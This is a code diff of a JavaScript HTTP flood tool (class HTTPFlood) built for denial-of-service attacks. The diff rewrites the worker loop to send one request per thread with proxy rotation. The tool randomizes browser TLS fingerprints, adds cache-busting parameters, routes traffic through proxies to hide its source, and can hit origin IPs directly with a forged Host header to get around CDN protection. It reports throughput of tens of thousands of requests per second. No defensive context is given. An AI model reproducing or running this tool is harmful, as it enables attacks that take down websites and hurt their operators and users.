@@ -690,21 +690,21 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: M2 OPTIMIZED (${config.proxies.length > 0 ? '2' : '5'} concurrent/thread)`);
+        console.log(`[*] Mode: SIMPLIFIED (1 request/thread, reliable)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
-        console.log(`[*] Protocol: Optimized HTTP/1.1 (${config.proxies.length > 0 ? '8000' : '4000'}ms timeout)`);
+        console.log(`[*] Protocol: HTTP/1.1 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
         console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         if (config.proxies.length > 0) {
-            console.log(`[*] Proxy: Instant rotation on timeout/abort errors`);
-            console.log(`[*] Proxy: Longer timeout (8s) to ensure traffic reaches target`);
+            console.log(`[*] Proxy: Simple rotation after 3 fails`);
+            console.log(`[*] Proxy: 10 second timeout for slow proxies`);
             if (config.maxRPS) {
                 console.log(`[*] RPS Limit: ${config.maxRPS.toLocaleString()} requests/second (controlled)`);
             }
         }
         
-        const baseRPS = config.proxies.length > 0 ? 40 : 100;
-        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 15000 : 40000));
+        const baseRPS = config.proxies.length > 0 ? 50 : 120;
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 10000 : 40000));
         console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()} req/s`);
         
         if (this.threads > 100) {
@@ -735,136 +735,106 @@ class HTTPFlood {
     }
     
     async worker(threadId) {
-        let currentProxy = config.proxies.length > 0 ? getHealthyProxy() : null;
+        let proxyIndex = threadId % Math.max(config.proxies.length, 1);
+        let failCount = 0;
+        let successCount = 0;
         let localCount = 0;
         
         const profile = getRandomElement(BROWSER_PROFILES);
-        let cachedAgent = createTLSAgent(profile, currentProxy);
+        const useProxy = config.proxies.length > 0;
         
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const concurrent = currentProxy ? 2 : 5;
-            const requests = [];
+            const startTime = Date.now();
             
-            for (let i = 0; i < concurrent; i++) {
-                const requestPromise = (async () => {
-                    const startTime = Date.now();
-                    try {
-                        const randomProfile = Math.random() > 0.5 ? getRandomElement(BROWSER_PROFILES) : profile;
-                        const headers = getAdvancedHeaders(this.url, randomProfile);
-                        
-                        let targetUrl = this.url;
-                        if (this.originIPs.length > 0 && this.useOrigin) {
-                            const originIP = getRandomElement(this.originIPs);
-                            if (originIP !== this.domain) {
-                                targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
-                                headers['Host'] = this.domain;
-                            }
-                        }
-                        
-                        targetUrl = addCacheBuster(targetUrl);
-                        
-                        const axiosConfig = {
-                            method: this.method.toLowerCase(),
-                            url: targetUrl,
-                            headers,
-                            timeout: currentProxy ? 8000 : 4000,
-                            maxRedirects: currentProxy ? 3 : 5,
-                            validateStatus: () => true,
-                            httpsAgent: cachedAgent,
-                            httpAgent: cachedAgent,
-                            proxy: false,
-                            decompress: true,
-                            transitional: {
-                                clarifyTimeoutError: true
-                            }
-                        };
-                        
-                        if (this.method === 'POST') {
-                            axiosConfig.data = { data: 'x'.repeat(500) };
-                        }
-                        
-                        const response = await axios(axiosConfig);
-                        const latency = Date.now() - startTime;
-                        
-                        const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
-                        const bytesReceived = response.data ? String(response.data).length : 0;
-                        
-                        updateStats(true, response.status, bytesSent, bytesReceived);
-                        
-                        if (currentProxy) {
-                            updateProxyHealth(currentProxy, true, latency);
-                            if (localCount % 30 === 0) {
-                                const proxyIP = currentProxy.replace(/^https?:\/\//, '').split(':')[0];
-                                config.workingProxies.add(proxyIP);
-                            }
-                        }
-                        
-                        if (config.debug && localCount === 1) {
-                            console.log(`[DEBUG] T${threadId}: First request - Status: ${response.status} - Latency: ${latency}ms`);
-                        }
-                        
-                        if (config.debug && localCount % 500 === 0) {
-                            console.log(`[DEBUG] T${threadId}: ${response.status} - Reuse: ${config.stats.connectionReuse}`);
-                        }
-                        
-                        localCount++;
-                        
-                    } catch (error) {
-                        const latency = Date.now() - startTime;
-                        updateStats(false);
-                        
-                        const isTimeoutError = error.code === 'ECONNABORTED' || 
-                                             error.code === 'ETIMEDOUT' || 
-                                             error.code === 'ECONNREFUSED' ||
-                                             error.code === 'ENOTFOUND';
-                        
-                        if (currentProxy) {
-                            updateProxyHealth(currentProxy, false, latency);
-                            
-                            if (isTimeoutError) {
-                                currentProxy = getHealthyProxy();
-                                if (currentProxy) {
-                                    cachedAgent = createTLSAgent(profile, currentProxy);
-                                }
-                            } else {
-                                const health = config.proxyHealth.get(currentProxy);
-                                if (health && health.score < 30) {
-                                    currentProxy = getHealthyProxy();
-                                    cachedAgent = createTLSAgent(profile, currentProxy);
-                                }
-                            }
-                        }
-                        
-                        if (config.debug && localCount <= 10) {
-                            const errorType = isTimeoutError ? 'TIMEOUT/ABORT' : 'OTHER';
-                            console.log(`[DEBUG] T${threadId}: ${errorType} - ${error.code || error.message}`);
-                        }
-                    }
-                })();
+            try {
+                const headers = getAdvancedHeaders(this.url, profile);
+                let targetUrl = this.url;
                 
-                requests.push(requestPromise);
-            }
-            
-            await Promise.allSettled(requests);
-            
-            if (config.maxRPS && currentProxy) {
-                const elapsed = (Date.now() - config.stats.startTime) / 1000;
-                const currentRate = config.stats.totalRequests / elapsed;
-                if (currentRate > config.maxRPS) {
-                    const delayNeeded = (config.stats.totalRequests / config.maxRPS - elapsed) * 1000;
-                    if (delayNeeded > 0) {
-                        await new Promise(resolve => setTimeout(resolve, Math.min(delayNeeded, 100)));
+                if (this.originIPs.length > 0 && this.useOrigin) {
+                    const originIP = getRandomElement(this.originIPs);
+                    if (originIP !== this.domain) {
+                        targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
+                        headers['Host'] = this.domain;
                     }
                 }
-            }
-            
-            if (localCount % 50 === 0 && currentProxy) {
-                const health = config.proxyHealth.get(currentProxy);
-                if (health && health.score < 40) {
-                    currentProxy = getHealthyProxy();
-                    cachedAgent = createTLSAgent(profile, currentProxy);
+                
+                targetUrl = addCacheBuster(targetUrl);
+                
+                let agent = null;
+                if (useProxy) {
+                    const proxy = config.proxies[proxyIndex];
+                    agent = proxy.startsWith('https') 
+                        ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false })
+                        : new HttpProxyAgent(proxy);
+                }
+                
+                const axiosConfig = {
+                    method: this.method.toLowerCase(),
+                    url: targetUrl,
+                    headers,
+                    timeout: useProxy ? 10000 : 5000,
+                    maxRedirects: 3,
+                    validateStatus: () => true,
+                    decompress: true
+                };
+                
+                if (useProxy && agent) {
+                    axiosConfig.httpsAgent = agent;
+                    axiosConfig.httpAgent = agent;
+                    axiosConfig.proxy = false;
+                }
+                
+                if (this.method === 'POST') {
+                    axiosConfig.data = 'data=' + 'x'.repeat(500);
+                    axiosConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                }
+                
+                const response = await axios(axiosConfig);
+                const latency = Date.now() - startTime;
+                
+                const bytesSent = 500;
+                const bytesReceived = response.data ? String(response.data).length : 0;
+                
+                updateStats(true, response.status, bytesSent, bytesReceived);
+                
+                successCount++;
+                failCount = 0;
+                
+                if (useProxy && successCount % 20 === 0) {
+                    const proxyIP = config.proxies[proxyIndex].replace(/^https?:\/\//, '').split(':')[0];
+                    config.workingProxies.add(proxyIP);
+                }
+                
+                if (config.debug && localCount === 0) {
+                    console.log(`[DEBUG] T${threadId}: SUCCESS - Status: ${response.status} - Latency: ${latency}ms - Proxy: ${useProxy ? 'YES' : 'NO'}`);
+                }
+                
+                localCount++;
+                
+                if (config.maxRPS && useProxy) {
+                    const elapsed = (Date.now() - config.stats.startTime) / 1000;
+                    const currentRate = config.stats.totalRequests / elapsed;
+                    if (currentRate > config.maxRPS) {
+                        await new Promise(resolve => setTimeout(resolve, 50));
+                    }
+                }
+                
+            } catch (error) {
+                const latency = Date.now() - startTime;
+                updateStats(false);
+                
+                failCount++;
+                
+                if (config.debug && failCount <= 3) {
+                    console.log(`[DEBUG] T${threadId}: ERROR - ${error.code || error.message} - Proxy: ${useProxy ? config.proxies[proxyIndex].substring(0, 20) : 'NO'}`);
+                }
+                
+                if (useProxy && failCount >= 3) {
+                    proxyIndex = (proxyIndex + 1) % config.proxies.length;
+                    failCount = 0;
+                    await new Promise(resolve => setTimeout(resolve, 100));
                 }
             }
         }
